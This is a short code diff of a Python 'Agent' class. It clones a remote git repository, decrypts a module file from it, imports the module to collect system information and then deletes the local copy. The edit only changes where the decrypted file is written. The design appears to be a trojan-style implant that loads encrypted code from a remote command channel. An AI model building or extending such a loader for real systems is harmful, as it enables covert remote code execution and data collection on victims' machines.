@@ -31,14 +31,14 @@ class Agent:
                 local_directory = "temp_directory"
                 repo = git.Repo.clone_from(self.repository_url, local_directory)
                 # Decrypt the module file
-                self.encryption.decrypt_file(f"{local_directory}/modules/{module_name}.py")
+                self.encryption.decrypt_file(f"{local_directory}/modules/{module_name}.py", f"{local_directory}/modules/{module_name}_decrypted.py")
 
                 try:
                     # Add the local directory to the system path for module import
                     sys.path.append(os.path.join(os.path.dirname(__file__), "temp_directory"))
 
                     # Import the module and perform the necessary actions
-                    import modules.system_info as system_info_module
+                    import modules.system_info_decrypted as system_info_module
                     system_info_module = system_info_module.SystemInfoModule()
                     data = system_info_module.collect_data()
                     # Remove the local directory
